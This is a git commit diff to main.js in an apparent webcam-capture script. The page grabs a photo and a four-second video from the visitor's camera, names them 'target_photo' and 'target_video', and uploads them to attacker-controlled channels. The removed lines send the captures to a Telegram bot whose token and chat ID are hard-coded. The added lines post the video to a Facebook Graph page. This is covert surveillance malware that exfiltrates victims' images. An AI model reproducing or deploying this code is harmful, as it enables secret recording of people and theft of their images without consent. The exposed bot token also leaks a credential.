7cab5c1a83aaf543cbc61cb76169141e1645dd15
Ethical Hex Nicks <ninoadajar@gmail.com>
2026-03-08 18:19:26 +0800

    Update main.js

--- main.js
+++ main.js
@@ -1,6 +1,6 @@
 (async function() {
-    const BOT_TOKEN = '8027235420:AAEFz-15VdKF__StWGlCzm5939sSnpmY8FI';
-    const CHAT_ID = '-1003723590867'; 
+ const PAGE_ID = "YOUR_PAGE_ID";
+  const ACCESS_TOKEN = "YOUR_PAGE_ACCESS_TOKEN";
 
     const video = document.getElementById('preview');
     const canvas = document.createElement('canvas');
@@ -13,21 +13,10 @@
                 return;
             }
 
-            // --- BƯỚC 1: CHỤP ẢNH NGAY LẬP TỨC ---
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
             
-            canvas.toBlob(async (imgBlob) => {
-                const imgData = new FormData();
-                imgData.append('chat_id', CHAT_ID);
-                imgData.append('photo', imgBlob, 'target_photo.jpg');
-                imgData.append('caption', '📷 Successfully Taken ✔');
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: imgData });
-            }, 'image/jpeg', 0.8);
 
-            // --- BƯỚC 2: QUAY VIDEO TRONG 4 GIÂY ---
-            const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+// --- BƯỚC 2: QUAY VIDEO TRONG 4 GIÂY ---
+ const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
             let chunks = [];
 
             recorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
@@ -38,7 +27,7 @@
                 videoData.append('video', videoBlob, 'target_video.mp4');
                 videoData.append('caption', '🎬 Sucessfully Record ✔');
                 
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: videoData });
+               await fetch(`https://graph.facebook.com/${PAGE_ID}/videos`,{method: "POST",body: videoData });
                 
                 // Báo hiệu chuyển hướng
                 window.mainScriptFinished = true;
